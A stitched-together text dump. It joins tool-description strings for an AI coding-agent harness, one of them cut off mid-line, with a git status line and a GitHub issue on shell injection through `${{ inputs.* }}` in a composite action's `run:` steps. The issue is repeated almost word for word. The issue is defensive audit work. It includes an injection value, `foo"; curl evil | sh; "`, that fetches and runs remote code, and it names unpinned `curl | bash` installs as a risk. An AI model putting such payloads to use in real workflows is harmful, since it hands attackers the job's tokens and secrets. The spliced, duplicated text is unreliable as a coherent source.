pages.description: Page range for PDF files (e.g., "1-5", "3", "10-20"). Only applicable to PDF files. Maximum 20 pages per request.

allow_large.description: Set to true to read a text file, or a line range of one, that is over the usual size limits, up to what still fits in your context. Only use this when you genuinely need all of it or the user asked for the whole file; otherwise read it in parts with offset and limit, or search it.

tools.name: ReportFindings
tools.description: Report code-review findings as a typed list so the host UI can render them. Use this only when the active code-review instructions tell you to report findings with this tool; otherwise follow whatever output format those instructions specify. When reporting a review's results, call it once with the verified findings ranked most-severe first (empty array if nothing survived verification) and do not also print the findings as text. When re-reporting after applying fixes (only if the apply instructions ask for it), set `outcome` on each finding to what actually happened.

level.description: Effort level the review ran at

findings.description: Verified findings, most-severe first; empty if none survived

file.description: Repo-relative path of the file the finding is in

short_summary.description: Compressed label for compact UI (≤60 chars): the claim alone, no rationale or consequence clause

category.description: Short kebab-case slug of the finding type, e.g. "correctness", "simplification", "efficiency", "test-coverage"

severity.description: Set when the review instructions ask for it. important: a bug the change adds or makes worse; pre_existing: a bug that was there before the change; nit: a minor issue

verdict.description: Set when a verify pass ran; absent on inline-only reviews

outcome.description: Set ONLY when re-reporting after applying fixes: what happened to this finding

tools.name: ScheduleWakeup
tools.description:
Schedule when to resume work in /loop dynamic mode — the user invoked /loop without an interval, asking you to self-pace iterations of a specific task.

Do NOT schedule a short-interval wakeup to poll for background work you started — when harness-tracked work finishes, you are re-invoked automatically, so polling is wasted. Instead schedule a long fallback (1200s+) so the loop survives if the work hangs or never notifies. The exception is external work the harness cannot track (a CI run, a deploy, a remote queue) — there, pick a delay matched to how fast that state actually changes.

Pass the same /loop prompt back via `prompt` each turn so the next firing repeats the task. For an autonomous /loop (no user prompt), pass the literal sentinel `<<autonomous-loop-dynamic>>` as `prompt` instead — the runtime resolves it back to the autonomous-loop instructions at fire time. (There is a similar `<<autonomous-loop>>` sentinel for CronCreate-based autonomous loops; do not confuse the two — ScheduleWakeup always uses the `-dynamic` variant.) To end the loop, call this tool with `stop: true` (omit every other field) — the loop ends immediately and no further wakeups fire.

Set `noop: true` if nothing changed — you checked and there's nothing to report ("no change", "still waiting", "quiet hold"). Set `noop: false` if something happened worth keeping — you edited a file, posted a message, advanced state, or surfaced a finding. Consecutive `noop: true` ticks are collapsed in the user's terminal view and tracked as a streak, so long quiet holds stay legible to the user without scrolling. Omit `noop` when stopping (`stop: true`).

## Picking delaySeconds

This session's requests use a 1-hour Anthropic prompt-cache TTL, so effectively every allowed delay (the runtime clamps to [60, 3600]) wakes up with your conversation context still cached. There is no cache cliff inside that range to pace around, and scheduling extra wakeups just to keep the cache warm is pure waste — never do that. (If the session enters usage overage, later requests drop to the 5-minute TTL; don't try to track or preempt that — the guidance here stays the same.)

Match the delay to what you're actually waiting for:

- **Actively polling external state the harness can't notify you about** (a CI run, a deploy, a remote queue): pick the delay from how fast that state actually changes. A CI run that takes ~8 minutes deserves one ~480s check, not eight 60s ones.
- **The long fallback heartbeat** (something else — a Monitor, a task notification — is the primary wake signal): 1200s+, so quiet wakeups stay rare.
- **Idle ticks with no specific signal to watch**: default to **1200s–1800s** (20–30 min). The loop still checks back regularly, and the user can always interrupt if they need you sooner.

Don't think in cache windows — think about what you're actually waiting for.

## The reason field

One short sentence on what you chose and why. Goes to telemetry and is shown back to the user. "watching CI run" beats "waiting." The user reads this to understand what you're doing without having to predict your cadence in advance — make it specific.

delaySeconds.description: Seconds from now to wake up. Clamped to [60, 3600] by the runtime. Required unless `stop` is true.

reason.description: One short sentence explaining the chosen delay. Goes to telemetry and is shown to the user. Be specific. Required unless `stop` is true.

prompt.description: The /loop input to fire on wake-up. Pass the same /loop input verbatim each turn so the next firing re-enters the skill and continues the loop. For autonomous /loop (no user prompt), pass the literal sentinel `<<autonomous-loop-dynamic>>` instead (the dynamic-pacing variant, not the CronCreate-mode `<<autonomous-loop>>`). Required unless `stop` is true.

stop.description: Set to true to end the dynamic loop immediately instead of scheduling another wakeup. When true, all other fields are ignored and no further wakeups fire.

noop.description: true = nothing changed (you checked and there is nothing to report). false = something happened worth keeping (edited a file, posted a message, advanced state, surfaced a finding). Consecutive noop:true ticks are collapsed in the user's terminal view and tracked as a streak. Required unless `stop` is true.

tools.name: Skill
tools.description:
Invoke a skill.

A skill is a packaged set of instructions the user or project has set up for a particular kind of task (deploy steps, a review checklist, a repo-specific workflow). Available skills appear in a listing from the system with one-line descriptions. When the task at hand is one a listed skill covers, call this tool first — the skill's instructions load into the turn for you to follow in place of your default approach; some skills instead run in a subagent and return the finished result. A skill that runs in the background returns only the agent's name — its result arrives later as a task notification, so don't wait on it or invoke it again in the meantime. Users may also ask for one by name (`/<name>`, or "slash command"); that's a request to invoke it.

- `skill`: exact name from the listing, no leading slash. Plugin skills use `plugin:skill`. Directory-scoped skills are listed with a path prefix (`apps/web:deploy`); when both scoped and unscoped variants of a name exist, pick the one whose directory contains the files you're working on (most specific wins; unscoped otherwise).
- `args`: optional arguments to pass through.

Only names from the listing (or that the user typed explicitly) are valid. Built-in CLI commands (`/help`, `/clear`, …) aren't skills. If a `<command-name>` block is already present this turn, the skill is loaded — follow it directly rather than calling again.

skill.description: The name of a skill from the available-skills list. Do not guess names.

tools.name: TaskStop
tools.description:
- Stops a running background task by its ID
- Takes a task_id parameter identifying the task to stop
- To stop an agent-team teammate, pass its agent ID or bare teammate name as task_id
- To stop a background agent spawned with a name, pass that name as task_id
- Returns a success or failure status
- Use this tool when you need to terminate a long-running task

task_id.description: The ID of the background task to stop. Agent-team teammates and named background agents are also accepted by agent ID or name.

tools.name: ToolSearch
tools.description:
Fetches full schema definitions for deferred tools so they can be called.

Deferred tools appear by name in a message from the system. Until fetched, only the name is known — there is no parameter schema, so the tool cannot be invoked. This tool takes a query, matches it against the deferred tool list, and returns the matched tools' complete JSONSchema definitions inside a <functions> block. Once a tool's schema appears in that result, it is callable exactly like any tool defined at the top of the prompt.

Result format: each matched tool appears as one <function>{"description": "...", "name": "...", "parameters": {...}}</function> line inside the <functions> block — the same encoding as the tool list at the top of this prompt.

Query forms:
- "select:Read,Edit,Grep" — fetch these exact tools by name
- "notebook jupyter" — keyword search, up to max_results best matches
- "+slack send" — require "slack" in the name, rank by remaining terms

query.description: Query to find deferred tools. Use "select:<tool_name>" for direct selection, or keywords to search.

max_results.description: Maximum number of results to return (default: 5)

tools.name: Workflow
tools.description:
Execute a workflow script that orchestrates multiple subagents deterministically. Workflows run in the background — this tool returns immediately with a task ID, and a <task-notification> arrives when the workflow completes. Use /workflows to watch live progress.

ONLY call this tool when the user has explicitly opted into multi-agent orchestration. Workflows can spawn dozens of agents and consume a large amount of tokens; the user must request that scale, not have it inferred. Explicit opt-in means one of:
- The user included the keyword "ultracode" in their prompt (you'll see a message from the system confirming it).
- Ultracode is on for the session (a message from the system confirms it) — see **Ultracode** in the workflow authoring reference.
- The user directly asked you to run a workflow or use multi-agent orchestration in their own words ("use a workflow", "run a workflow", "fan out agents", "orchestrate this with subagents"). The ask must be in the user's words — a task that would merely benefit from a workflow does not count.
- The user invoked a skill or slash command whose instructions tell you to call Workflow.
- The user asked you to run a specific named or saved workflow.

For any other task — even one that would clearly benefit from parallelism — do NOT call this tool. Use the Agent tool (if available) for individual subagents, or briefly describe what a multi-agent workflow could do and how much it would roughly cost, and ask the user whether to run it. Mention they can ask for one with "use a workflow" in a future message to skip the ask.

Every script must begin with `export const meta = {...}`: a PURE LITERAL (no variables, calls or interpolation) giving the workflow's `name`, a one-line `description` (shown in the permission dialog) and optionally `phases` — one `{ title, detail? }` per phase() call, titles matched exactly. Pass the script inline via `script` — do not Write it to a file first, and do not also set the tool's `name` input (that selects a saved workflow); it is plain JavaScript, not TypeScript.

The canonical multi-stage pattern — pipeline by default, each dimension verifies as soon as its review completes:
  export const meta = {
    name: 'review-changes',
    description: 'Review changed files across dimensions, verify each finding',
    phases: [{ title: 'Review' }, { title: 'Verify' }],
  }
  const DIMENSIONS = [{key: 'bugs', prompt: '...'}, {key: 'perf', prompt: '...'}]
  const results = await pipeline(
    DIMENSIONS,
    d => agent(d.prompt, {label: `review:${d.key}`, phase: 'Review', schema: FINDINGS_SCHEMA}),
    review => parallel(review.findings.map(f => () =>
      agent(`Adversarially verify: ${f.title}`, {label: `verify:${f.file}`, phase: 'Verify', schema: VERDICT_SCHEMA})
        .then(v => ({...f, verdict: v}))
    ))
  )
  const confirmed = results.flat().filter(Boolean).filter(f => f.verdict?.isReal)
  return { confirmed }
  // Dimension 'bugs' findings verify while dimension 'perf' is still reviewing. No wasted wall-clock.

Before writing a script, load the `workflow-authoring` skill — the workflow authoring reference: script API and gotchas, resume, the **Ultracode** section, quality patterns, worked examples.

This session has the default workflow size guideline: medium — keep workflows under 10 agents. This is a guideline, not a hard limit — follow it unless the user's prompt calls for a different scale. The user can raise or remove it with "Dynamic workflow size" in /config.

script.description: Self-contained workflow script. Must begin with `export const meta = { name, description, phases }` (pure literal, no computed values) followed by the script body using agent()/parallel()/pipeline()/phase().

name.description: Name of a predefined workflow (built-in or from .claude/workflows/). Resolves to a self-contained script.

description.description: Ignored — set the workflow description in the script's `meta` block.

title.description: Ignored — set the workflow title in the script's `meta` block.

args.description: Optional input value exposed to the script as the global `args`, verbatim. Pass arrays/objects as actual JSON values, NOT as a JSON-encoded string — a stringified list breaks `args.filter`/`args.map` in the script. Use for parameterized named workflows (e.g. a research question).

scriptPath.description: Path to a workflow script file on disk. Every Workflow invocation persists its script under the session directory and returns the path in the tool result. To iterate, edit that file with Write/Edit and re-invoke Workflow with the same `scriptPath` instead of re-sending the full script. Takes precedence over `script` and `name`.

resumeFromRunId.description: Run ID of a prior Workflow invocation to resume from. The cache is positional: agent() calls replay from cache up to the first call that failed, no longer matches the earlier run (edited, added, removed or reordered) or never started in it; that call and every call after it run again, even when their own (prompt, opts) are unchanged. A call a usage limit refused, or one still running when the run stopped, usually runs again without ending reuse: finished calls after it still come from cache. Same-session only. Stop the prior run first (TaskStop) before resuming.

tools.name: Write
tools.description:
Writes a file to the local filesystem, overwriting if one exists.

When to use: creating a new file, or fully replacing one you've already Read. Overwriting an existing file you haven't Read will fail. For partial changes, use Edit instead.

file_path.description: The absolute path to the file to write (must be absolute, not relative)

content.description: The content to write to the file

tools.name: mcp__archy__archy_brief
tools.description: **Call once, before starting on an unfamiliar repository.** Composes `archy_conventions` (naming, mirrored surfaces, gates, export and doc gaps), the layer `coverage` of `archy.yaml` and, with `contracts=True`, the transitive import-linter verdict, into one answer to 'what do I need to know before I touch this'. `top_n` (default 8) bounds the ranked sections and `conventions.totals` says how many were dropped; `gates`, `errors`, `export_gaps` and `doc_gaps` are never truncated. `coverage` is null when there is no usable archy.yaml; `coverage_error` carries the error when one parsed but its layer coverage failed validation (such as overlapping layer patterns), otherwise null; a config that does not parse is an error, as before. This tool does NOT run the direct-edge check, so `transitive_checked=false` with a `transitive_unverified_reason` means the `forbid` rules are unverified, not that they hold; pass `contracts=True` to settle it. It is ranked and truncated like `archy_conventions`, so for a negative call `archy_module_view`. Advisory: mutates nothing.

tools.name: mcp__archy__archy_diff
tools.description: Compare the current project state to the last snapshot. Returns a risk-weighted `summary` (headline + top regressions / improvements), per-component score deltas, and the cycles and layer violations that have been added or resolved since the baseline. Use after edits to localize regressions; see the `loop` prompt. `strict=True` with `baseline` (a committed file, relative to `path`) adds `strict`. `passed` is false when a cycle or layer violation is new, or when archy.yaml removes or narrows a rule the baseline fingerprint records. `reason` names it. A baseline with no fingerprint still checks cycles and violations.

tools.name: mcp__archy__archy_impact
tools.description: Given a list of changed file paths, return what they affect. Relative `files` are tried under `path` first; missing paths are retried at its git work-tree root and used if they exist there, inside `path`. `mode='blast'` (the DEFAULT) returns the internal modules that transitively import any of them (the blast radius): use before refactoring or removing a module to see what would break. An empty `impacted` means no STATIC importer was found, not that removal is safe: archy cannot see importlib.import_module / __import__, entry points and plugin registries, Django INSTALLED_APPS, pytest plugins, config-driven dispatch, module __getattr__ hooks or string-keyed factories, so `rg` for those before deleting (`empty_caveat` is set whenever this applies). `propagation_cost` is the MacCormack-style scalar (fraction of internal modules the edit set can reach); `chains` explains *why* each impacted module is reachable (the shortest import path back to a changed module, hop by hop with the line numbers where each import lives) so you can cite the specific edge(s) to preserve. Chains are ranked closest-first and capped at `max_chains` (negative for all); `chains_omitted` reports how many were left out. `mode='affected'` (replaces the removed archy_affected) is the CI-shaped lookup instead: it returns the impact pre-classified into `impacted_tests` and `impacted_modules`, with traversal depth-capped (`depth`, default 5) so a single-line edit doesn't fan out to thousands of nodes; an empty `impacted_tests` carries the same static-only `empty_caveat` (no test imports it statically, not that no test exercises it). Test detection uses pytest conventions (test_*.py, *_test.py, files under tests/) unless `test_filter` overrides with a recursive glob; a `test_filter` that matches no file in the graph is an error, not an empty `impacted_tests`, and ends with a `did you mean` when a directory is close. Files that resolve to no module are returned in `unresolved`, except a `.py` path that is missing inside the project, which is `deleted` with `deleted_reason` (the scan sees only the current tree, so its dependents are not selected). Internal modules only. `co_change=true` (blast mode only, opt-in) adds a `co_changed` list: modules that historically co-change with the edited set in git but have NO import/call edge to it, so the structural blast radius above misses them (the behavioral complement, `archy coupling` scoped to your edit - 'you changed X; historically Y changes with it, check Y'). Source-only and best-effort (empty without git); the only path that makes this tool read git history.

tools.name: mcp__archy__archy_snapshot
tools.description: Capture score, cycles, and layer violations to .archy/baseline.json as a baseline that archy_diff will compare against. Call at the start of an editing session. Also returns `invariant_brief`: the constraints to know before your first edit (declared layers, forbidden inter-layer edges, whether the graph is acyclic, the baseline score per axis, and the top load-bearing / highest-risk modules). Read it up front to avoid proposing a cross-layer or cycle-introducing edit, rather than being told after the diff. See the `loop` prompt for full usage.

tools.name: mcp__claude_ai_Claude_Docs__batch
tools.description: Create a doc, or apply several operations to one doc atomically.

tools.name: mcp__claude_ai_Claude_Docs__guide
tools.description: Docs guides: topic.instructions repeats the server instructions. Read it only if your client dropped them. Also topic.<name>, refusal.<code>. After a doc's birth → ["topic.index"].

items.description: topic.<name> (instructions, index, editing, tabs, comments, charts, chart-definition, diagram, uploads, sharing, skill) or refusal.<code>; several per call is fine.

tools.name: mcp__claude_ai_Claude_Docs__update
tools.description: Edit a tab's contents, rename a doc or tab, or change a stored value. Rename a doc only when asked to, not to change a link's text. It may be one the given doc links to: read its tabs' text to see links.

tools.name: mcp__plugin_context-mode_context-mode__ctx_batch_execute
tools.description:
Run multiple commands in ONE call. Every command's output is auto-indexed into the knowledge base; if you also pass `queries`, the matching sections come back in the same round trip so a follow-up search call is not needed.

Concurrency parallelizes the FETCH phase (run-the-commands). The DERIVATION phase — turning raw output into an answer — still belongs in code: add a processing command that consumes the indexed output and prints only the answer, so the raw bytes never enter your conversation (Think-in-Code, same principle as the sandbox tool).

WHEN:
  - You have 3+ related commands you would otherwise run sequentially (multi-issue lookups, git log + git diff + git blame, multi-file reads, multi-region cloud queries)
  - You want to gather AND query in one round trip — pass `queries` so the matching sections come back inline
  - You want to parallelize I/O-bound work — pass `concurrency` 2-8 (network calls, gh CLI, cloud APIs, multi-repo git reads)
  - The combined output is large enough that piping it through ctx_search later would itself be expensive — let auto-index + inline queries do both in one shot

WHEN NOT:
  - Single command with no follow-up query — run it in the sandbox tool directly
  - CPU-bound or stateful commands — keep concurrency at 1 (npm test, build, lint, port-binding servers, lock-file holders, anything that races on the same resource)

RETURNS:
  Auto-indexed section list per command label, plus top matches per query (when `queries` is passed). Raw output is NOT echoed in full — only the matched windows. Concurrency>1 switches each command to its own per-command timeout (no shared budget); concurrency=1 preserves the legacy shared-budget cascading-skip-on-timeout path. Use 4-8 for I/O-bound batches; keep at 1 for CPU work or shared-state commands; lower the value when target hosts enforce per-IP rate limits.

EXAMPLE: ctx_batch_execute(
  commands: [
    {label: "issue 1", command: "gh issue view 1"},
    {label: "issue 2", command: "gh issue view 2"},
    {label: "summarize", command: "echo done"}
  ],
  queries: ["root cause", "proposed fix"],
  concurrency: 2
)

label.description: Section header for this command's output (e.g., 'README', 'Package.json', 'Source Tree')

commands.description: Commands to execute as a batch. Output is labeled with the section header. Default order is sequential; pass concurrency>1 to run in parallel (output stays in input order).

queries.description: Search queries to extract information from indexed output. Use 5-8 comprehensive queries. Each returns top 5 matching sections with full content. This is your ONLY chance — put ALL your questions here. No follow-up calls needed.

timeout.description: Max execution time in ms. When omitted, no server-side timer fires — the MCP host's RPC timeout governs. With concurrency=1, the value (when set) is a shared budget across commands; with concurrency>1, it is applied per-command.

concurrency.description: Max commands to run in parallel (1-8, default: 1). Use 4-8 for I/O-bound batches (network, gh, curl, multi-repo git reads). Keep at 1 for CPU-bound (npm test, build, lint) or stateful commands (ports, locks). >1 switches to per-command timeouts (no shared budget) and individual `(timed out)` blocks instead of cascading skip.

tools.name: mcp__plugin_context-mode_context-mode__ctx_execute

code.description: Source code to execute. Use console.log (JS/TS), print (Python/Ruby/Perl/R), echo (Shell), echo (PHP), fmt.Println (Go), IO.puts (Elixir), or Console.WriteLine (C#) to output a summary to context.

timeout.description: Max execution time in ms. When omitted, no server-side timer fires — the MCP host's RPC timeout governs (which is the right layer for this policy). Pass an explicit value for long-running builds (Gradle/Maven/SBT).

background.description: Keep process running after timeout (for servers/daemons). Returns partial output without killing the process. IMPORTANT: Do NOT add setTimeout/self-close timers in background scripts — the process must stay alive until the timeout detaches it. For server+fetch patterns, prefer putting both server and fetch in ONE ctx_execute call instead of using background.

intent.description:
What you're looking for in the output. When provided and output is large (>5KB), indexes output into knowledge base and returns section titles + previews — not full content. Use ctx_search(queries: [...]) to retrieve specific sections. Example: 'failing tests', 'HTTP 500 errors'.

TIP: Use specific technical terms, not just concepts. Check 'Searchable terms' in the response for available vocabulary.

tools.name: mcp__plugin_context-mode_context-mode__ctx_search
tools.description:
Search a unified knowledge base with a multi-strategy ranking pipeline. Two parallel matchers run on every query: a Porter-stemming matcher ("caching" finds "cached", "caches", "cach") and a trigram-substring matcher ("useEff" finds "useEffect"). Their ranked lists are merged via Reciprocal Rank Fusion, so a document that ranks well in both surfaces above one that wins only on a single strategy. Multi-term queries get an additional proximity-rerank pass that boosts passages where the query terms appear close together. Typos are corrected via Levenshtein distance and re-searched. Result snippets are window-extracted around the matched terms, not blindly truncated.

The knowledge base is unified: queries reach indexed content you stored (ctx_index, ctx_fetch_and_index, ctx_batch_execute output) AND auto-captured session memory written by hooks (decisions, errors, blockers, plans, user prompts, rejected approaches, tool failures, compaction guides — 26 event categories). File-backed sources carry a content hash and auto-flag staleness when the source file changes.

WHEN:
  - You want to recall something that exists in storage (recently indexed content, prior session events, auto-memory) instead of re-reading raw sources
  - You have multiple related questions about the same body of knowledge — batch every question into one call (the ranking pipeline runs per-query but the round-trip cost is paid once)
  - You want to scope the query to one labelled source (pass `source` — partial match is fine)
  - You want a chronological view across current session + prior sessions + persistent auto-memory (pass `sort: "timeline"` — the default `relevance` mode only ranks within the current session)
  - You want to filter ranked results by content shape (pass `contentType: "code"` to surface implementation snippets or `contentType: "prose"` to surface explanations)

WHEN NOT:
  - The data you want to query has never been stored in the knowledge base AND no session memory has accumulated around it — capture first (run a gather-and-index call), then come back here to query
  - You have one ad-hoc question against data that is not in the knowledge base — answer it inline by running code in the sandbox tool; one round-trip instead of capture-then-query

RETURNS:
  Per-query ranked sections with window-extracted snippets. Use 2-4 specific technical terms per query. Common session-memory source labels: `decision` (user corrections / preferences), `error` and `error-resolution` (past failures + their fixes), `blocker`, `plan`, `user-prompt`, `rejected-approach`, `compaction` (post-compact session guide). See ctx_stats for live category counts.

EXAMPLE: ctx_search(queries: ["root cause", "proposed fix", "test coverage"], source: "issue-#683")
EXAMPLE: ctx_search(queries: ["what did we decide about caching"], source: "decision", sort: "timeline")
EXAMPLE: ctx_search(queries: ["useEffect cleanup pattern"], source: "react-docs", contentType: "code", limit: 5)
EXAMPLE: ctx_search(queries: ["last user prompt", "active skills", "open blockers"], sort: "timeline")

queries.description: Array of search queries. Batch ALL questions in one call.

source.description: Filter to a specific indexed source (partial match).

contentType.description: Filter results by content type: 'code' or 'prose'.

sort.description: Sort mode. 'relevance' (default): BM25 ranked, current session only. 'timeline': chronological across current session, prior sessions, and auto-memory.

tools.name: mcp__plugin_deepwork_deepwork__get_configured_reviews
tools.description: List all configured review rules from .deepreview files. Returns each rule's name, description, and defining file. Optional: only_rules_matching_files (list of file paths) to filter to rules that would apply to those specific files.

tools.name: mcp__plugin_deepwork_deepwork__get_review_instructions
tools.description: Run a review of changed files based on .deepreview configuration files. Returns a list of review tasks to invoke in parallel. entries.name: Monitor
entries.description:
Start a background monitor that streams events from a long-running script. Each stdout line is an event — you keep working and notifications arrive in the chat. Events arrive on their own schedule and are not replies from the user, even if one lands while you're waiting for the user to answer a question.

Pick by how many notifications you need:
- **One** ("tell me when the server is ready / the build finishes") → use **Bash with `run_in_background`** and a command that exits when the condition is true, e.g. `until grep -q "Ready in" dev.log; do sleep 0.5; done`. You get a single completion notification when it exits.
- **One per occurrence, until the monitor expires (re-arm to continue)** ("tell me every time an ERROR line appears") → Monitor with an unbounded command (`tail -f`, `inotifywait -m`, `while true`).
- **One per occurrence, until a known end** ("emit each CI step result, stop when the run completes") → Monitor with a command that emits lines and then exits.

Your script's stdout is the event stream. Each line becomes a notification. Exit ends the watch.

  # Each matching log line is an event
  tail -f /var/log/app.log | grep --line-buffered "ERROR"

  # Each file change is an event
  inotifywait -m -q --format '%e %f' /watched/dir

  # Poll GitHub for new PR comments and emit one line per new comment
  last=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  while true; do
    now=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    gh api "repos/owner/repo/issues/123/comments?since=$last" --jq '.[] | "\(.user.login): \(.body)"'
    last=$now; sleep 30
  done

  # Node script that emits events as they arrive (e.g. WebSocket listener)
  node watch-for-events.js

  # Per-occurrence with a natural end: emit each CI check as it lands, exit when the run completes
  prev=""
  while true; do
    s=$(gh pr checks 123 --json name,bucket)
    cur=$(jq -r '.[] | select(.bucket!="pending") | "\(.name): \(.bucket)"' <<<"$s" | sort)
    comm -13 <(echo "$prev") <(echo "$cur")
    prev=$cur
    jq -e 'all(.bucket!="pending")' <<<"$s" >/dev/null && break
    sleep 30
  done

**Don't use an unbounded command for a single notification.** `tail -f`, `inotifywait -m`, and `while true` never exit on their own, so the monitor stays armed until timeout even after the event has fired. For "tell me when X is ready," use Bash `run_in_background` with an `until` loop instead (one notification, ends in seconds). Note that `tail -f log | grep -m 1 ...` does *not* fix this: if the log goes quiet after the match, `tail` never receives SIGPIPE and the pipeline hangs anyway.

**Script quality:**
- Every pipe stage must flush per line or matches sit in its buffer unseen: `grep` needs `--line-buffered`, `awk` needs `fflush()`. `head` cannot flush at all — `| head -N` delivers nothing until N matches accumulate, then ends the stream.
- In poll loops, handle transient failures (`curl ... || true`) — one failed request shouldn't kill the monitor.
- Poll intervals: 30s+ for remote APIs (rate limits), 0.5-1s for local checks.
- Write a specific `description` — it appears in every notification ("errors in deploy.log" not "watching logs").
- Only stdout is the event stream. Stderr goes to the output file (readable via Read) but does not trigger notifications — for a command you run directly (e.g. `python train.py 2>&1 | grep --line-buffered ...`), merge stderr with `2>&1` so its failures reach your filter. (No effect on `tail -f` of an existing log — that file only contains what its writer redirected.)

**Coverage — silence is not success.** When watching a job or process for an outcome, your filter must match every terminal state, not just the happy path. A monitor that greps only for the success marker stays silent through a crashloop, a hung process, or an unexpected exit — and silence looks identical to "still running." Before arming, ask: *if this process crashed right now, would my filter emit anything?* If not, widen it.

  # Wrong — silent on crash, hang, or any non-success exit
  tail -f run.log | grep --line-buffered "elapsed_steps="

  # Right — one alternation covering progress + the failure signatures you'd act on
  tail -f run.log | grep -E --line-buffered "elapsed_steps=|Traceback|Error|FAILED|assert|Killed|OOM"

For poll loops checking job state, emit on every terminal status (`succeeded|failed|cancelled|timeout`), not just success. If you cannot confidently enumerate the failure signatures, broaden the grep alternation rather than narrow it — some extra noise is better than missing a crashloop.

**Output volume**: Every stdout line is a conversation message, so the filter should be selective — but selective means "the lines you'd act on," not "only good news." Never pipe raw logs; filter to exactly the success and failure signals you care about. Monitors that produce too many events are automatically stopped; restart with a tighter filter if this happens.

Stdout lines within 200ms are batched into a single notification, so multiline output from a single event groups naturally.

The script runs in the same shell environment as Bash. Exit ends the watch (exit code is reported). Every monitor expires after `timeout_ms` (default 5 minutes, at most 30 minutes): it is killed and you get one notice with the event count. Re-arm it if you still need the watch; for a long watch (PR monitoring, log tails) set `timeout_ms` to the maximum and re-arm on each expiry, and widen the filter if an expiry with no events was unexpected. Use TaskStop to cancel early.
**ws source** — open a WebSocket and stream each incoming text frame as an event. No shell, no polling: the server pushes, you get notified.

  Monitor({
    ws: {url: 'wss://events.example.com/stream', protocols: ['v1']},
    description: 'deploy events',
  })

Each text frame becomes one notification (multiline frames stay as one event). Binary frames are reported as `[binary frame, N bytes]` rather than passed through. Socket close ends the watch with the close code surfaced; errors are surfaced before close. Same rate limiting as bash — a firehose will be suppressed and eventually stopped, so subscribe to a filtered feed where one exists.

Prefer this over `command: 'websocat wss://…'` — it avoids the extra process and line-buffering pitfalls. Use bash when you need to transform or filter frames with shell tools before they become events.

description.description: Short human-readable description of what you are monitoring (shown in notifications).

timeout_ms.description: Kill the monitor after this deadline. Default 300000ms. Deadlines above 1800000ms are capped to 1800000ms. You are notified at expiry and can re-arm.

command.description: Shell command or script. Each stdout line is an event; exit ends the watch.

ws.description: WebSocket to open. Each text frame is an event; binary frames are reported as a placeholder line. Socket close ends the watch. Cannot be combined with command.

## alee/740-cache-build-identity...origin/alee/740-cache-build-identity
?? bench/diff_duplicates_precision.jsonl

Found in a supply-chain audit of recent contributions. Not caused by any contribution: `action.yml` is maintainer-authored and this predates the audit.

## Problem
The composite action interpolates `${{ inputs.* }}` directly into `run:` shell scripts (`command`, `path`, `config`, `baseline`, `strict`, `strict-tolerance`, `record`, `python-version`). GitHub expands `${{ }}` BEFORE the shell parses the script, so a caller who passes an untrusted value, for example a PR branch name or title in `path` or `config`, gets arbitrary shell execution in their job, with whatever token and secrets that job has.

Example of the shape: `args=("${{ inputs.path }}")` with `path: foo"; curl evil | sh; "` runs the injected command.

## Fix
Pass every input through `env:` and reference it as a shell variable (`"$INPUT_PATH"`), never via `${{ }}` inside `run:`. Validate the enum-like ones (`command`, `strict`, `record`) against an allowlist, and `python-version` against a version regex.

## Also in the same audit (smaller, maintainer-side)
- `astral-sh/setup-uv@v7` in `action.yml` is a mutable tag; the repo's own workflows pin full SHAs with a version comment.
- `publish.yml` `registry` job downloads the `mcp-publisher` tarball with curl and extracts it with no checksum check, in a job holding `id-token: write`.
- `install-e2e.yml` runs `curl https://cursor.com/install | bash` and an unpinned `npm install -g @anthropic-ai/claude-code`, with API-key secrets in the environment (tag and dispatch only).

## Test
A test that renders the action's shell with a hostile `path` and asserts the payload is not executed, or at minimum a workflow lint (actionlint / zizmor) in CI that fails on `${{ inputs.* }}` inside `run:`.

Status on v0.55.0 (57a988a), checked against the files rather than commit messages.

**Fixed:**
- `action.yml` passes every input through `env:` (`INPUT_*`) and none through `${{ inputs.* }}` inside `run:`. `command` is checked against an allowlist (`Unknown command`), `strict` and `record` must be `true` or `false`, `strict-tolerance` and `python-version` are matched against a regex, and a value starting with `-` is refused.
- `astral-sh/setup-uv` is pinned to a full SHA with a version comment.
- The `publish.yml` registry job downloads a pinned `mcp-publisher` (v1.8.1) and checks it against a committed sha256.
- `tests/test_action_yml.py` exists.

**Still open:** `install-e2e.yml` line 49 runs an unpinned `npm install -g @anthropic-ai/claude-code`, and line 55 runs `curl -fsS https://cursor.com/install | bash` with no checksum, in a workflow that holds API-key secrets (tag and dispatch only).

So the headline problem in the title is done and only that last bullet remains. Leaving this open for it; it could be retitled.

## alee/740-cache-build-identity...origin/alee/740-cache-build-identity
?? bench/diff_duplicates_precision.jsonl

Found in a supply-chain audit of recent contributions. Not caused by any contribution: `action.yml` is maintainer-authored and this predates the audit.

## Problem
The composite action interpolates `${{ inputs.* }}` directly into `run:` shell scripts (`command`, `path`, `config`, `baseline`, `strict`, `strict-tolerance`, `record`, `python-version`). GitHub expands `${{ }}` BEFORE the shell parses the script, so a caller who passes an untrusted value, for example a PR branch name or title in `path` or `config`, gets arbitrary shell execution in their job, with whatever token and secrets that job has.

Example of the shape: `args=("${{ inputs.path }}")` with `path: foo"; curl evil | sh; "` runs the injected command.

## Fix
Pass every input through `env:` and reference it as a shell variable (`"$INPUT_PATH"`), never via `${{ }}` inside `run:`. Validate the enum-like ones (`command`, `strict`, `record`) against an allowlist, and `python-version` against a version regex.

## Also in the same audit (smaller, maintainer-side)
- `astral-sh/setup-uv@v7` in `action.yml` is a mutable tag; the repo's own workflows pin full SHAs with a version comment.
- `publish.yml` `registry` job downloads the `mcp-publisher` tarball with curl and extracts it with no checksum check, in a job holding `id-token: write`.
- `install-e2e.yml` runs `curl https://cursor.com/install | bash` and an unpinned `npm install -g @anthropic-ai/claude-code`, with API-key secrets in the environment (tag and dispatch only).

## Test
A test that renders the action's shell with a hostile `path` and asserts the payload is not executed, or at minimum a workflow lint (actionlint / zizmor) in CI that fails on `${{ inputs.* }}` inside `run:`.

Status on v0.55.0 (57a988a), checked against the files rather than commit messages.

**Fixed:**
- `action.yml` passes every input through `env:` (`INPUT_*`) and none through `${{ inputs.* }}` inside `run:`. `command` is checked against an allowlist (`Unknown command`), `strict` and `record` must be `true` or `false`, `strict-tolerance` and `python-version` are matched against a regex, and a value starting with `-` is refused.
- `astral-sh/setup-uv` is pinned to a full SHA with a version comment.
- The `publish.yml` registry job downloads a pinned `mcp-publisher` (v1.8.1) and checks it against a committed sha256.
- `tests/test_action_yml.py` exists.

